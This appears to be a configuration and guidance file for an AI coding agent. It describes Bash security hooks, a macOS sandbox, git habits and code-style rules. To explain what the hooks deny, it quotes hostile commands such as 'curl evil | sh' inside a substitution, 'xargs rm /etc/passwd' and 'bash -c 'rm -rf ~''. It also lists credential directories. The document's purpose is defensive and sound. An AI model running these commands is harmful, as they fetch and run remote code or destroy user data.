## Git invocation

Run plain `git ...` (e.g. `git status`, `git log`, `git diff`) from inside the target repo. To work on a _different_ repo (a worktree, a fixture in a temp dir), `cd` into it first **as its own Bash call** (the Bash tool's CWD persists across calls), then run plain `git`. Do **not** use top-level `git -C <path>`: the `git-deny-dash-c.py` hook denies it. (Subcommand-level `-C` such as `git diff -C` / `git blame -C` for copy detection is fine. Only the top-level directory `-C` is blocked.)

## No redundant `cd`

Never prepend `cd <path> && ...` to a command when `<path>` is already the shell's current working directory. The Bash tool's CWD persists across calls, so the `cd` is pure noise. Worse, it changes the command string enough to miss the user's allowlist and trigger an extra permission prompt. If you genuinely need a different directory, run `cd` as its own separate Bash call, or for non-git tools use a per-command flag (`make -C`, `npm --prefix`, `pytest --rootdir=`). For git, `cd` first. Top-level `git -C` is denied by a hook (see "Git invocation").

This holds even when the `cd` is _not_ redundant. Claude Code force-prompts (`cd-compound-redirect`) any compound command that combines `cd` with output redirection — **including `2>&1` and pipes**, e.g. `cd app && rushx lint:typecheck 2>&1 | tail -5`. Run the `cd` as its own Bash call first, then the command separately (`cd app` -> `rushx lint:typecheck 2>&1 | tail -5`), so no single command mixes `cd` with a redirect. In a monorepo where you must run from a package subdir (e.g. `rushx`), this is the most common avoidable prompt. Subagents must follow this too.

## No reasoning or code snippets inside Bash commands

Keep a Bash command to just the command. Never prepend multi-line `#` comment blocks to it — especially ones that paste code containing braces (`{` `}`) next to quotes (`'` or `"`). Claude Code runs a safety scan over the whole command string, comments included, and force-prompts anything where a brace sits next to a quote, with the reason "Contains brace with quote character (expansion obfuscation)". This fires even for allow-listed commands like `sed`, so the prompt looks like it came from nowhere. Put your reasoning in the message text, not in the command. If you must annotate a command, use one short `#` note with no braces or quotes.

## Bash security hooks run through one dispatcher

Every PreToolUse check for `Bash` runs inside a single process, `dispatch-bash.py`, instead of one hook process per rule. Claude Code used to spawn ~10-14 python interpreters on every Bash call (one per hook), and each cold start costs ~30-40ms, so a burst of them ran on each command and multiplied under review fan-out (many subagents times many Bash calls). The dispatcher runs all the checks in one interpreter: it imports each hook module once and drives its `main()` by swapping stdin/stdout around the call. Net effect is about one hook's cost for all of them (~0.045s vs ~0.4-0.5s of CPU summed per call), with no change to what any rule does.

The individual hook scripts (`deny-shell-wrapper.py`, `deny-env-vars.py`, `bash-allow-trusted.py`, and the rest) are left byte-identical and still run standalone, so each keeps its own `tests/<hook>_test.sh` as the source of truth for that rule. The dispatcher only sequences them. It runs every applicable hook and merges with `deny > ask > allow` precedence (any deny wins), not first-match: `gh api /x/$(whoami)` must deny via the command-substitution check even though the gh guard would allow the read.

To add, remove, or reorder a Bash check, edit the `HOOKS` list in `dispatch-bash.py`, not `settings.json`. The Bash matcher in `settings.json` now wires only the single dispatch entry; the other matchers (`Write`/`Edit`, `Read`, `WebFetch`, `Workflow`) still point at their hooks directly and are unaffected. Each `HOOKS` entry is `(filename, guard)`: `guard=None` runs the hook on every Bash command (an unconditional entry), and a leading-token guard mirrors the old settings.json `if`. Keep the guard on `deny-unallowlisted-host.py`: unlike the gh/cd/git hooks it does not self-guard on its leading token (it scans any command for hosts), so without the curl/wget guard it would flag unrelated commands that merely mention a URL. `tests/dispatch_bash_test.sh` verifies the dispatcher reproduces exactly what the hooks produce when run separately.

## No inline scripting inside Bash commands

The `deny-shell-wrapper.py` hook blocks any Bash command that buries the real work inside an opaque blob. The point: the permission allowlist and the sibling hooks (cd, git, gh, write) all read the FIRST token of the command, so anything you smuggle past that token is invisible to them. The denied shapes are:

- **Shell `-c` wrappers.** `bash -c '...'`, `sh -c`, `zsh -c`, `dash -c`, `ksh -c`, `mksh`, `ash`, `pwsh -c`. Also blocks bundled clusters like `-lc`, `-ec`.
- **Interpreter code strings.** `python -c`, `pypy -c`, `perl -e` / `-E`, `ruby -e`, `node -e` / `-p` / `--eval` / `--print`, `bun -e`, `deno eval`. Including packed forms like `python -cprint(1)`.
- **Inline function definitions.** `name() { ... }` and `function name { ... }`.
- **`for` / `while` / `until` / `select` loops** with a `do ... done` body.
- **`eval`, `source`, `.`** at command-position (start of stream or after a separator).
- **Heredocs piped into an interpreter.** `python3 <<EOF ... EOF`, `bash <<-EOF ...`, etc. Heredocs feeding `cat` / `tee` to write a file are fine.
- **Multi-line ANSI-C `$'...\n...'` strings** containing a real newline or an escaped `\n`.

Invocation wrappers (`env`, `sudo`, `command`, `exec`, `nice`, `nohup`, `time`, `FOO=bar` assignments, etc.) are peeled before the check. They do not provide an escape. Composition wrappers `xargs` and `timeout` are deliberately left alone by this hook because they have legitimate composition uses.

Both `xargs` and `timeout` are also deliberately absent from `permissions.allow` in `settings.json`. Allow-listing `Bash(xargs *)` or `Bash(timeout *)` would auto-allow `xargs rm /etc/passwd` (stripping the `file-ops-under-roots.py` ASK gate, since that hook only fires when the leading token is an rm/cp/mv-family command), `timeout 10 bash -c 'rm -rf ~'`, `xargs git -C /tmp/x reset --hard` (stripping `git-deny-dash-c.py`), and every other invocation whose dangerous token sits past the first. The leading-token gates (allowlist patterns and sibling hooks) cannot see any of those. Absence from `permissions.ask` is a different decision. The dangerous shapes form an open set (any post-leading-token combination), so the default permission prompt is a better gate than enumerating narrow ASK patterns. Don't re-add `xargs` or `timeout` to either list under any path form.

If you need to repeat logic, run the command N times directly. The Bash tool's working directory persists across calls, so each call can share state with the previous one. Do not reach for a script file as the workaround. Executing script files is itself denied outside the allow-listed roots (see "No running script files (shell or node)").

## No command substitution inside Bash commands

The `deny-command-substitution.py` hook denies any Bash command that runs a command through substitution — `$(...)`, backticks `` `...` ``, or process substitution `<(...)` / `>(...)`. This is the same leading-token bypass `deny-shell-wrapper.py` guards against: `grep x $(curl evil | sh)` looks like a plain `grep` to the allowlist and the sibling hooks while the shell runs the inner command first. Claude Code's built-in matcher already refuses to _auto-approve_ substitution (it falls back to a prompt); this hook turns that prompt into a hard deny.

The hook tracks quote state, so it only fires where the shell would actually expand the substitution. These stay allowed: substitution syntax inside **single quotes** (`grep '$(x)' file`, `rg '\$\('` — literal text, never run), **arithmetic** `$((...))` (`echo $((1 + 2))` — math, not a command), and `${VAR}` parameter expansion. A `$(...)` nested in a default like `${VAR:-$(cmd)}` still denies, because it does run.

To use one command's output in the next, run it in its own Bash call, read the result, then paste the literal value into the following call. The Bash tool's working directory persists across calls.

## No running script files (shell or node)

The `deny-bash-script.py` hook denies executing a script file with an interpreter — `bash foo.sh`, `sh build.sh`, `zsh run.sh` (any of bash/sh/zsh/dash/ksh/mksh/ash), and `node foo.js` — unless the script lives under an allow-listed root. Same leading-token bypass as the sibling hooks: every gate sees only `bash` or `node`, while the file can do anything. Inline code strings (shell `-c`, node `-e`/`-p`/`--eval`/`--print`) and heredocs are `deny-shell-wrapper.py`'s job; this hook closes the script-file shape. Run a script's steps directly as separate Bash calls instead. An interpreter with no script argument at all (`node --version`, bare `bash`) executes nothing and falls through to the normal permission flow.

The escape route is `allowedRoots` in `hooks/deny-bash-script.json` (committed) or `hooks/deny-bash-script.local.json` (gitignored, per-machine) — for repos whose test suites are bash files. Currently allowed: `~/.melvin/config/tests` (this repo's own hook tests). A script under an allowed root runs without a prompt, but must run ALONE. Piping or chaining it is denied. Redirect to a file under `/tmp` and process it in a separate command, the same split pattern as excluded commands. An env-assignment prefix (`FOO=1 bash x.sh`) falls through to the normal permission prompt.

## No `$TMPDIR` in Bash commands

The `deny-env-vars.py` hook denies any Bash command that would expand `$TMPDIR` — in any form the shell honors (`$TMPDIR`, `${TMPDIR}`, `"$TMPDIR"`, `${TMPDIR:-/tmp}`). Use the full path directly instead of using an env variable: temp files go under `/tmp/claude/` (or `/tmp/`). The reason for the ban: in this setup `$TMPDIR` resolves to the macOS per-user temp dir (`/var/folders/...`), which the sandbox write-denies, so commands honoring it fail at the kernel with a confusing "operation not permitted". An env-var path also hides the real target from the permission gates. Literal text stays allowed: single-quoted (`rg '\$TMPDIR'`) and escaped (`echo \$TMPDIR`) forms never expand, and `TMPDIR=/x cmd` only sets the variable. The banned list lives in `BANNED_VARS` inside the hook. Extend it there, with matching cases in `tests/deny_env_vars_test.sh`.

## No `find /` (keep finds focused)

The `deny-find-root.py` hook denies any `find` whose search root is the filesystem root `/` (`find /`, `find / -name …`, `find -L /`, `find //`, `find /.`). A whole-filesystem walk is slow, noisy, and almost never what's wanted. Scope the search to a directory instead, either `find <dir> …` (a repo path or `.`), or `rg --files <dir>` / `fd . <dir>`. For a genuine system search, narrow to the relevant subtree (`/etc`, `/usr/local`, …). Only the leading **search roots** are checked (past `-H`/`-L`/`-P`, before the expression), so a `/` used as an expression value (`-path /`, `-newer /`) is left alone. Same command-position + wrapper carve-out shape as `deny-awk.py`: `… | find /` is caught, but `env`/`sudo`/`xargs`/`FOO=1`-prefixed forms fall through (the agent is steered on the bare form). Tests in `tests/deny_find_root_test.sh`.

## Redirects go at the end of a command

Never place a redirect mid-command with more arguments after it, e.g. `rg --files src 2>/dev/null --glob '!dist' | head -40`. The shell would hand the post-redirect tokens back to `rg`, but Claude Code's safety parser refuses to vouch for that shape: it force-prompts with the reason "Redirect has multiple targets — post-redirect args swallowed", even when every pipeline segment is allow-listed. Write the redirect as the last token of its segment instead (`rg --files src --glob '!dist' 2>/dev/null | head -40`). Or just drop `2>/dev/null`, which is rarely needed in the first place.

## Fan-out skills must run in the main thread

Tool availability is not symmetric across an agent boundary, and the loss is silent in both directions. A subagent typically does not get the `Workflow` tool. A workflow agent, meaning one spawned by the `Workflow` tool's `agent()` call, does not get the `Agent` tool. Neither absence is announced. Check for the tool rather than assuming either way. The agent simply has one fewer tool than the skill it is running assumes, and each direction breaks whichever skills depend on the missing half. The first half is documented inside a skill (`work-on` Step 2 falls back to plain concurrent `Agent` calls when `Workflow` is absent). The second half is what this section is for. A sub-agent keeps its own `Agent` tool, which is why `pr-review` can launch `in-depth-review` as one and still get the full role fan-out. The workflow boundary is the one that takes the tool away.

A skill that fans out into sub-agents has nothing to fan out with inside a workflow agent. `in-depth-review` cannot launch its eight to twelve roles. `review-and-fix` cannot launch its reviewers. `pr-review` cannot launch its finders. Each aborts there rather than returning a review. Without that abort each would collapse to a single reader, and that single reader would report degraded coverage in the same shape a completed review uses. The caller would see a coverage field, read prose that looks like a review, and move on. That is a false negative wearing a disclaimer, which is worse than a loud failure, and it is what both guards below exist to prevent.

`hooks/deny-review-in-workflow.py` denies a `Workflow` that would run one of those skills inside it. It scans the workflow's code and never its data, meaning the call's `script`, the contents of `scriptPath`, the saved workflow name, and the file that name resolves to under `.claude/workflows/`. A saved name is resolved against both the session cwd and `$HOME`, across the plausible extensions, so a body kept on disk is read the same as an inline one. `args` is deliberately not scanned. It carries a ticket description, a comment thread, PR titles, and commit subjects, all of it other people's prose written for another purpose, and this repo's own history holds a commit subject naming `work-on`. Scanning `args` made that single subject enough to deny `work-on`'s own Step 2 call. A name in data is not a call.

The names that trigger the deny live in `DENIED_SKILLS` inside the hook, currently `in-depth-review`, `review-and-fix`, `pr-review`, `work-on`, and `open-ticket`. That last entry is the one exception to the fan-out reason the paragraphs above give. `open-ticket` keeps a usable fallback when its fan-out goes away, and what a workflow agent cannot do is put its Step 9 approval gate in front of a human. That gate is the only control on a Jira creation, which has no rollback, so inside a workflow the skill would either block on an approval nobody can give or file issues nobody approved. Do not drop that entry on the grounds that the fan-out survives. Two agent types sit in `DENIED_AGENT_TYPES` beside it, `pr-review-finder-indepth` and `pr-review-finder-indepth-deep`, because those wrappers run `in-depth-review` and therefore fan out exactly as the skill does. Extend whichever list fits, with matching cases in `tests/deny_review_in_workflow_test.sh`. The match is case-insensitive on the real spelling, so `In-Depth-Review` denies. It also needs a word boundary, and the two boundaries are asymmetric on purpose. The one before excludes letters and digits only, so `nightly-pr-review` still denies. The one after excludes a hyphen as well, so a longer name sharing a skill's prefix falls through, such as `work-on-validate`. That asymmetry is what lets Step 2's own workflow run. It is also why a future `pr-review-*` fan-out wrapper needs its own entry in `DENIED_AGENT_TYPES` rather than inheriting the skill's. A leaf agent type such as `in-depth-review-role` is deliberately allowed, since a workflow script's own `agent()` calls run at the orchestrator level and can launch a leaf perfectly well.

The escape hatch is a `no-fanout-ok:` marker with a reason on the same line, in the workflow body. It is for a workflow that must name these skills without running them, such as one that audits or edits the skills themselves, where no wording change can avoid the name. A bare marker is not a bypass, because the reason has to be on that line. The deny reason does not mention the hatch, so reaching for it takes knowing it is here.

The hook is wired as its own PreToolUse `Workflow` matcher in `settings.json`, not through `dispatch-bash.py`. That dispatcher exists to collapse many per-Bash-call hook processes into one interpreter, and it only ever sees `Bash` input, so a `Workflow` check cannot live in its `HOOKS` list.

`gh-style-review` is deliberately absent from the deny list. It is a single pass over one diff and spawns nothing, so a workflow agent runs it exactly as the main thread would and there is nothing to degrade. That is the general shape of the carve-out. A leaf agent that spawns nothing is fine inside a workflow, and only a skill whose value comes from its own fan-out is not. `work-on`'s Step 2 validation lenses are the worked example of a legitimate fan-out inside a workflow. That phase drives a workflow whose agents are the seven lenses, the telemetry probes, the triage agents on a bug or security ticket, the skeptics, the completeness critic, and one synthesizer, and every one of those is a leaf that reads and reports. The fan-out sits above the workflow rather than inside a skill the workflow launched, so nothing has to reach for a tool it does not have. That workflow is named `work-on-validate`. The word boundary in the hook's match is what lets the call through, so the carve-out is checkable against the hook rather than taken on trust. Its `args` carry the ticket description, the comment thread, the PR titles, and the branch's commit subjects, and none of that is scanned at all.

The hook only sees a `Workflow` whose text names a skill, so it cannot catch a workflow agent that decides to run a deep review on its own initiative. The skills carry the backstop for that case. `in-depth-review` aborts with `REVIEW_UNAVAILABLE_NO_FANOUT` when it has no `Agent` tool, and its callers treat coverage `impossible` as an abort rather than as partial coverage. Tests in `tests/deny_review_in_workflow_test.sh`.

## Code comments

Commenting code is good. Keep doing it. But every comment must earn its place. Follow these rules:

- **Explain _why_, not _what_.** Capture intent, a constraint, an edge case, or the reason for an unobvious choice. Do not narrate code that already reads clearly. `// increment the counter` above `count++` is noise. You can explain the what, if it help explaining the why.
- **No changelog or diff comments.** A comment describes the code as it stands now, never how it got there. Ban `// added this`, `// changed from X`, `// new logic`, `// was previously ...`, `// TODO: remove old impl`. That history lives in git, not in the source.
- **Don't restate the line below.** If the comment is just an English paraphrase of the next statement, delete it. The code is the source of truth and the comment will rot the moment the code changes.
- **No ticket numbers.** Never reference the current ticket or issue in a comment. The reader has the code, not your tracker.
  - Good: `// some comment.`
  - Bad: `// some comment (TICKET-0123).`
- **Keep them short and focused.** One or two lines is the norm. Only write a long paragraph when the logic is genuinely complex and a short note cannot carry it.
- **Write plainly.** Use short sentences. Avoid semicolons. Aim for a middle-school or high-school reading level, while still using normal software engineering terms.
- **One thought per sentence. Don't glue clauses with a dash or a colon.** When you catch yourself joining two independent clauses with `-` (space-hyphen-space, used as a stand-in for an em-dash) or with a `:` that splits a claim from its elaboration, stop and write two sentences instead. This is the same "split the sentence" rule as the Plain ASCII section below, applied to the punctuation people actually reach for.
  - Bad: `// This function never throws and never rejects - a Redis failure must not turn an already-committed write into an error.`
  - Good: `// This function never throws and never rejects. A Redis failure must not turn an already-committed write into an error.`
  - Bad: `// log first: it is the primary signal and must not be suppressed.`
  - Good: `// Log first. It is the primary signal and must not be suppressed.`
  - This bans the dash and colon only as clause JOINERS. Leave them alone everywhere else: hyphenated words (`read-only`, `already-committed`), CLI flags (`-c`), ranges (`1-10`), label prefixes at the start of a line (`TODO:`, `NOTE:`, `IMPORTANT:`, `Good:`, `Bad:`), ratios and times (`3:1`, `12:00`), and code, paths, or URLs.

## Claims in authored prose

This governs prose that asserts something about the code: comments and docstrings, commit messages, PR and issue descriptions. A false claim in prose is worse than no prose, because a reader trusts it and nothing checks it. Every rule below exists because the claim it bans was written and was wrong.

- **Point at code, never paraphrase it.** A comment describing what another function does is a claim that rots. A comment naming where the answer lives is not. Point at a symbol this code already names. Never point at code this file does not reference, because that adds coupling the file cannot see and the comment then goes stale without anyone touching its line. If you have not opened the file you are about to describe, you may not describe it.
  - Bad: `// updateSubscriptionWithNewData would mail the subscriber`
  - Good: `// See the docstring on updateSubscriptionWithNewData for why a terminal answer must not reach it.`
  - The pointer is checkable by opening one file. The paraphrase is checkable only by re-deriving the collaborator's behavior, which is work that reliably does not happen. A claim that needs code this file does not reference is not a comment. It belongs in the PR description or a doc.
- **Name the set, never quantify it.** The words `nothing`, `never`, `always`, `every`, `only`, `none`, `the one`, and `the only` each assert a search result. Either you ran the search, or you do not write the word. When you ran it, write the result instead of the quantifier.
  - Bad: `// every reader checks canceled_at first`
  - Good: `// read by subscription-details.ts:791 and twice in subscription-details-controller.ts`
  - A named list ages visibly. "Every" rots silently. The rule covers a quantifier ranging over a set you would have had to go and enumerate. Four things are therefore not violations, and a grep for these words surfaces all four. A quantifier about the function in front of you needs no search, so `// this function never throws` is fine. An instruction is not a claim, so a rule that says never do X is fine. A rhetorical aside about people rather than about code is not a claim about code. And literal content is exempt, so one of these words inside a string, a fixture, or quoted output is not a violation.
- **Claim nothing you cannot observe from this repo.** A payment vendor's validation rules, an upstream API's ordering, a browser quirk. Assert what we send. Do not assert what they accept.
  - Bad: `// Braintree requires the cap to exceed the current cycle`
  - Good: `// We send a cap above the current cycle. No claim is made here about which caps Braintree accepts.`
- **Describe an artifact from the artifact.** A commit message describes `git diff --cached`. A PR body describes the branch diff. Read the diff, then write the description. Writing either from your own fix list produces a message describing work you did not do.

## TypeScript: narrow with type guards, don't cast

A cast tells the compiler to stop checking. It does not change what the value actually is at runtime. If the value does not match the asserted type, nothing fails at the cast itself. It fails later, somewhere else, with an error that points at the wrong line. A type guard checks the value and narrows the type from that check, so the runtime truth and the static type stay in agreement.

Avoid these shapes:

- `value as SomeType` to force a shape the compiler cannot see for itself.
- `value as unknown as SomeType`, the double cast. This is the loudest smell in the list. It means the compiler actively disagrees and is being overruled twice.
- `as any` to make a red squiggle go away.
- The non-null assertion `!` on something that can genuinely be null or undefined at runtime. `arr.find(...)!` is the classic case.

Prefer these instead:

- **Built-in narrowing.** `typeof x === 'string'`, `x instanceof Error`, `'kind' in x`, `Array.isArray(x)`, or a plain truthiness check. The compiler narrows automatically and there is nothing to keep in sync.
- **A user-defined type predicate** when the shape needs a real runtime check. Write the check once and let every call site benefit:
  ```ts
  function isUser(x: unknown): x is User {
    return typeof x === "object" && x !== null && "id" in x && typeof x.id === "string";
  }
  ```
- **A discriminated union** with a literal `kind` or `type` field, then `switch` on that field. Each branch narrows for free, and the compiler can tell you when a new variant is unhandled.
- **Validation at trust boundaries.** Parse external input (API responses, request bodies, JSON read from disk, env vars) with whatever schema validator the repo already uses. A parsed value arrives correctly typed, so nothing downstream needs a cast.

These are fine and are not what this rule is about:

- `as const` for literal types. It narrows rather than asserting something unproven.
- `satisfies` to check a value against a type while keeping its narrow inferred type. Reach for `satisfies` before reaching for `as`.
- Deliberately partial fixtures in tests, where the missing fields are the point.

When a cast looks unavoidable, that is usually a signal that a type is wrong further upstream or that a boundary is missing its validation step. Fix the upstream type or add the guard. Do not paper over it at the use site.

## Logging levels

Error level is what monitors are keyed to. Anything a human needs to see and act on emits at error, even when the code handled it and recovered. A bug logged at warn is a bug nobody is paged for.

Warn is for a condition you expected, handled, and nobody needs to act on. If you can name who must act on it and what they would do about it, it was not a condition you expected, so it is an error. A condition nobody must act on does not belong at error, since every false error dilutes the level monitors page on.

A `catch` block that logs and continues must say why continuing is correct. Swallowing a failure converts it into silent wrong behavior, which is harder to diagnose than a crash. If the fallback path is genuinely fine, a comment naming why belongs there. If it is not fine, the log is an error and the failure propagates.

## Don't log at error and throw the same failure

A thrown error already produces a log where it surfaces. So an error-level log next to a `throw` for the same failure emits two entries for one event. That doubles the volume monitors page on, and a reader chasing the second entry finds the same failure they already read. Pick one. Throw when the caller must react, and let the error message carry the context. Log at error when the code handles the failure and nothing propagates.

The same defect appears one level up. A `catch` that logs at error and rethrows double-reports it. Rethrow bare, or wrap with `cause` to preserve the original, and leave the reporting to whoever catches it last.

Log and throw together only when the two carry different data. Context the exception cannot hold is the case that earns it, such as the request payload, the row that failed, or an id the user-facing message must not expose. Log that context alone and throw the rest. Restating the exception message in the log does not count as different data.

## Emitting metrics

Emit a metric only when something will consume it. Be able to name the consumer before adding the metric, meaning a dashboard, a monitor, or an experiment readout. A cron is the clear yes case. Nobody watches it run, so the monitor keyed to its success or its absence is the consumer. Unread telemetry is not free. It persists indefinitely, and it advertises a monitoring story that does not exist, so a later reader trusts a signal no alert is keyed to.

- A counter next to an error-level log for the same failure usually fails this test (`calmLogger.error` in Calm repos). The error log is already the loud, alertable signal, so the counter earns its place only if you specifically need the aggregate volume as well. See "Logging levels" above.
- Prefer deriving a number from data already kept, such as a table you can count or an event already emitted, over a new counter whose only purpose is to be counted.
- Splitting one condition across several counters needs a reason a reader can check. If two counters exist so a dashboard can tell two causes apart, say which dashboard. Otherwise emit one, or none.

## Plain ASCII in authored prose

Text you write for humans -- commit messages, code comments, PR and issue descriptions, docs -- uses plain, keyboard-typable ASCII punctuation. The fancy Unicode glyphs read as AI-written, and most people can't type them to match. Substitute:

- `->` not `→`, `<-` not `←`
- `...` not `…`
- `>=` / `<=` not `≥` / `≤`, and `x` not `×`
- straight quotes `'` and `"`, not the curly variants
- two separate sentences instead of the em-dash `—` or en-dash `–` to join clauses. Do not chain thoughts with a dash at all. That includes the ASCII stand-in `-` (space-hyphen-space) and a clause-splitting `:`. Split the sentence instead. (See the "One thought per sentence" rule under Code comments for the allowed non-joiner uses of `-` and `:`.)

This governs prose you author. It does NOT mean mangling literal content: quoted command output, a string or identifier in the code, file contents you are reproducing, or a name that genuinely contains a Unicode character all stay verbatim. Don't "fix" a `→` that is actually part of the data.

## Sandbox mode

Bash commands run inside an OS-level sandbox (macOS Seatbelt). It is a safety _floor_ beneath the permission rules and hooks. `autoAllowBashIfSandboxed` is **off**, so the prompt/approval flow is unchanged. The sandbox only adds hard OS limits that the kernel enforces. `allowUnsandboxedCommands` is **off** too: the Bash tool's `dangerouslyDisableSandbox` parameter is silently ignored, so retrying a sandbox-denied command with it just fails the same way. When a command genuinely needs to escape the sandbox (e.g. `melvin-config claude sync`, which writes `~/.claude`), don't retry. Ask the user to run it themselves in a regular terminal. It governs **Bash only**. The Write / Edit / Read tools stay on the hooks plus permission rules. The whole block assumes macOS/Seatbelt: `failIfUnavailable` is on, so on any host where the sandbox backend cannot initialize, Claude Code refuses to start rather than run unprotected.

What the sandbox enforces for Bash:

- **Writes** are allowed only under the dev roots (`~/Dev/repos`, `~/Dev/worktrees`, `~/.melvin/config`) and `/tmp` (and its canonical form `/private/tmp`). A write anywhere else fails at the kernel. By **default** the sandbox also denies writes to `.git` (and git internals), `.claude/hooks`, `.claude/skills`, `.mcp.json`, and every `settings.json`, so don't try to hand-write those from Bash. Git itself writes `.git` fine because git runs unsandboxed (see below).
- **Reads** are blocked for the home credential dirs (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, `~/.netrc`) and the **whole `~/.config`** — a broad deny so every current and future tool token under it (`gh`, `gcloud`, `op`, `stripe`, `vercel-plugin`, `configstore`, …) is covered without enumerating each. `~/.npmrc` (not under `~/.config`) stays readable so sandboxed `pnpm install` keeps working. The Go toolchain is unaffected: on macOS `go` reads `~/Library/Application Support/go/env`, not `~/.config`. If a sandboxed tool ever needs a non-secret `~/.config` subdir, re-allow just that path with `sandbox.filesystem.allowRead`. A denied read fails loudly, so breakage is obvious, not silent. Everything else stays readable.
- **Network** egress is allowlisted. The allowlist is the set of `WebFetch(domain:…)` allow rules (plus `sandbox.network.allowedDomains`), which the sandbox reuses. WebFetch prompts on an unknown host; a sandboxed `curl`/`wget` to an unknown host is denied up front by `deny-unallowlisted-host.py` (see "Blocked network hosts" below). Add a host with `melvin-config claude perms allow add --fetch <host>`.
- **Process inspection**: `ps` and `top` are setuid binaries, and the sandbox refuses to exec those. They die at the kernel with "operation not permitted" (exit 127) regardless of args or path, so don't retry. Use `pgrep` instead: it works sandboxed because the `com.apple.sysmond` Mach service is allowed (`sandbox.network.allowMachLookup`). Beware that a piped `ps aux | grep x` fails _silently_ (exit 0, empty output to the next command).

Some tools run **outside** the sandbox (`sandbox.excludedCommands`) and are gated by the normal permission rules instead:

- `docker` — incompatible with the sandbox.
- `gh`, `go get`, `go mod` — Go CLIs fail TLS verification under Seatbelt.
- **all `git`** — `.git` is write-denied inside the sandbox, so running git unsandboxed lets `commit`/`add`/`fetch` (and git-over-SSH) work normally. Local git is still repo-scoped and gated by the allowlist plus `git-deny-dash-c.py`.

**Excluded commands must run alone — no pipe or chain.** They run unsandboxed, so `permissions.allow` doesn't stop them prompting. `bash-allow-trusted.py` re-grants the trusted ones (the allow-listed git/gh/docker/go subcommands — mostly read-only, but the set is exactly the intersection of allow and excluded — plus `rushx test`, `docker build`/`compose`, …), but only when they run by themselves — optionally with `2>&1` / `2>/dev/null` and/or a single `> file` into a write root. It **denies** a trusted command that is piped or chained. So don't write `git --no-pager grep … | head -40`. Split it: run `git --no-pager grep … > /tmp/out.txt`, then `cat /tmp/out.txt | head -40`. The second command is sandboxed, so the pipe is handled normally there. This keeps the hook from ever having to parse a pipeline.

A leading env-assignment prefix (`FOO=bar git …`) is refused by default. git/gh honor an open-ended set of command-injecting vars (`GIT_SSH_COMMAND`, `GIT_CONFIG_*`, `GIT_PAGER`, …), so a prefixed trusted command falls through to a normal prompt. The exception is an explicit allowlist of harmless var NAMES in `safe_assignments` (in `bash-allow-trusted.json`/`.local.json`): a trusted command prefixed only with those (e.g. `ENV_TIER=local rushx test …`) is re-granted. It must still run ALONE. The prefix does not lift the no-pipe rule.

Rollback: set `sandbox.enabled` to `false`, re-sync (`melvin-config claude sync`), and restart Claude Code. On a personal computer the symlinked `~/.claude/settings.json` makes the edit live, so only a restart is needed. Hooks and permission rules are unchanged, so behavior returns to exactly pre-sandbox.

## Access failures: report and ask, never improvise

When any tool **cannot reach a resource** — a host off the allowlist, a denied permission prompt, a fetch that errors or times out — **STOP and ask the user.** Do **not** retry, cache-bust, mirror, switch to a different source, fall back to `curl`/`wget`, hand-fetch the content another way, or guess what the page said. Tell the user exactly which domain you could not reach and ask how they want to proceed. Silently substituting another method is the failure mode this rule exists to prevent.

The allowlist is the `WebFetch(domain:…)` allow rules plus `sandbox.network.allowedDomains`; anything else is blocked by the sandbox at the kernel. The fix is `melvin-config claude perms allow add --fetch <host>`, then `melvin-config claude sync` + restart. **The user** runs these, since sync needs to escape the sandbox. Re-run once the host is allowlisted.

This surfaces in three shapes:

- **`WebFetch` denied or failed.** An unknown domain prompts first; if you decline it (or it errors / is blocklisted), `report-access-failure.py` fires on `PermissionDenied` / `PostToolUseFailure` and reminds you to stop and ask. Don't route around it with `curl` or a web search. Prefer `WebFetch` over `curl` for web pages. It prompts on an unknown host and the same `--fetch` add unblocks it.
- **`curl` / `wget` to an unknown host** is denied before it runs by `deny-unallowlisted-host.py`, with a reason naming the host and the fix. Surface it; don't reach for a workaround.
- **Tools that resolve a host from config, not argv** (`go get`, `npm`/`pnpm install`, `pip`, a git-over-HTTPS clone of a new host) aren't seen by either hook. They fail mid-run with an opaque network error (`could not connect`, `operation not permitted`, a TLS/timeout error to a non-local host). Treat that as a blocked host, not a flake. Stop and ask.

## Installed CLI tools

- **ripgrep** (`rg`) is installed — prefer over `grep` for shell searches
- **fd** is installed — prefer over `find` for file finding by name/pattern
- **sd** is installed — prefer over `sed` for find-and-replace in files
- **GNU parallel** is installed — use for concurrent shell tasks when beneficial
